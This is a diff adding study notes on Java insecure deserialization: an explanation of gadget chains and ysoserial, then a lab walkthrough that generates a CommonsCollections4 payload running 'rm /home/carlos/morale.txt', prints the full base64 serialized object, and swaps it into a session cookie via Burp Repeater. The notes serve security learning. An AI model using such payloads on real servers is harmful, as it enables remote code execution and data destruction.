@@ -301,6 +301,228 @@ You must be precise for unserialize to work.
 
 
 
+<details>
+     <summary>Gadget chains</summary>
+
+
+🔥 What does Gadget Chain mean in Insecure Deserialization?
+======================================================================
+
+When there is an application that **deserialize** data coming from the user (which is dangerous if there is no validation), the attacker can send it objects that are crafted in a way that makes the program run certain code without what it intended.
+
+Here comes the role of **the Gadget Chain**.
+
+* * * * *
+
+
+🔗 What is the Gadget Chain?
+==========================
+
+✔️ Gadget = A piece of code that already exists
+----------------------------------
+
+An "adget" is a **method already present in the application or library** that the program uses for certain events.
+
+The attacker does not write new code...\
+*It just exploits a code that already exists*.
+
+* * * * *
+
+
+✔️ Gadget Chain = Linking several pieces of code together
+---------------------------------------
+
+Each gadget alone may not be harmful...\
+But when you connect them together in the form of a chain:
+
+**Magic Method → ​​Gadget → Gadget → Sink Gadget**
+
+In the end, you can reach **Sink Gadget**, which does something dangerous, such as:
+
+- Execute OS commands
+
+- Writing to files
+
+- Make HTTP requests
+
+- Or data leak
+
+* * * * *
+
+
+🧠 What's the whole idea?
+======================
+
+⚡ **You have no control over the code**\
+⚡ **But you have control over the Serialized Object that is decoded**\
+⚡ When it deserializes, the server itself will run these gadgets\
+⚡ Without what he means
+
+The attacker does nothing but construct the object in a specific way.
+
+* * * * *
+
+🧲 Kick-off Gadget (First Spark)
+===================================
+
+This is the most important step:
+It is a **magic method** that is executed automatically at the time of deserialization.
+
+like:
+
+- `__wakeup()` in PHP
+
+- `readObject()` in Java
+
+- `__destruct()`
+
+- `__call()`
+
+- `__invoke()`
+
+This is the beginning of the next series of gadgets.
+
+* * * * *
+
+
+🔥 A simple example to illustrate Gadget Chain
+=============================================
+
+Imagine a class that does log:
+
+- He takes input
+
+- He throws it to another method
+
+- The next thing you do is process
+
+- In the end, write to a file
+
+If the attacker was able to pass an object in such a way that its data would traverse the entire string...\
+Finally, he connects to write-to-file and writes anything he wants.
+
+* * * * *
+
+📦 Ok, where are Gadget Chains ready?
+=====================================
+
+Here comes the role of tools like:
+
+✔️ **ysoserial** (for Java)
+---------------------------
+
+The most famous tool that generates serialized payloads is based on ready-made gadget chains found in well-known libraries such as:
+
+- Apache Commons Collections
+
+-Spring
+
+- Groovy
+
+-Hibernate
+
+- JSON
+
+-And others
+
+for him?\
+Because the same library that contains gadgets is present on thousands of websites...\
+If the gadget chain works on one site, it will likely work on another site that uses the same library.
+
+
+⚙️ How does ysoserial work?
+=========================
+
+You choose:
+
+- Library (CommonsCollections1, CC7...)
+
+- The thing you want to do
+
+- It shows you the ready serialized object
+
+for example:
+
+`java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/hacked" > payload.ser `
+
+Then I sent it to the server that has deserialization vulnerability.
+
+* * * * *
+
+
+🧱 Why does Java 16+ need additional commands?
+===================================
+
+Because of **strong encapsulation** used in Java 16+:\
+Some internal classes are not accessible from tools such as ysoserial.
+
+You must open it by adding:
+
+`--add-opens`
+
+As it is written:
+
+`java -jar ysoserial-all.jar\
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+  ...`
+
+Purpose:\
+Open the internal packages so that the gadget chain works.
+
+
+🎯 Conclusion, boss
+==================
+
+- gadget chain = methods chain that already exists
+
+- The attacker only controls the data
+
+- magic methods start the chain
+
+-ysoserial generates ready-made strings for you
+
+- Java 16 You need to open the packages for ysoserial to work
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -574,8 +796,112 @@ TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9j
 
 
 
+<details>
+     <summary>Lab: Exploiting Java deserialization with Apache Commons</summary>
 
 
+1.  Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
+
+<img width="1502" height="629" alt="image" src="https://github.com/user-attachments/assets/f51c2fde-3932-4cc2-b44c-daecbec5df8b" />
+
+
+
+2.  Download the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:
+
+```java
+java \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+  --add-opens=java.base/java.net=ALL-UNNAMED \
+  --add-opens=java.base/java.util=ALL-UNNAMED \
+  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+
+```
+
+
+<img width="1123" height="616" alt="image" src="https://github.com/user-attachments/assets/2b364214-328a-43c5-9092-30bdb2ae82c6" />
+
+```json
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh
+cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u
+cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjM
+AgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv
+Y29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0
+aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y
+Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy
+MMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj
+dGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z
+NC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s
+bGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z
+dGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p
+bnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu
+Y29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+k
+htA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph
+dmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz
+cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz
+SW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj
+b2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf
+b3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tb
+Qkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqzK/rq+AAAAMgA5CgADACIH
+ADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B
+AAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh
+YmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy
+aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y
+bQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z
+dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl
+cjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0
+Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy
+aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu
+L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv
+eG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv
+aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1
+TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo
+YW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp
+YWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5
+c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v
+c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z
+bGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50
+ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H
+YWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo
+KUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50
+eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy
+ADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIxMTQxOTA3NzU1MzI5AQAe
+THlzb3NlcmlhbC9Qd25lcjExNDE5MDc3NTUzMjk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIA
+CAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAA
+BQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAA
+AQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAA
+AAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQAC
+AAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVex
+AAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAy
+ABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx
+5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh
+cmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXls
+b2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcA
+GgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVj
+dAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0
+cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwAB
+sQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAW
+ABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2
+cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWph
+dmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyV
+HQuU4IsCAAB4cAAAAAFxAH4AKXg=
+```
+
+
+3.  In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
+4.  Send the request to solve the lab.
+
+<img width="1469" height="866" alt="image" src="https://github.com/user-attachments/assets/6589b854-2587-4c7b-9bf4-03ef7240382c" />
+
+
+![Uploading image.png…]()
+
+
+
+
+
+     
+</details>
 
 
 
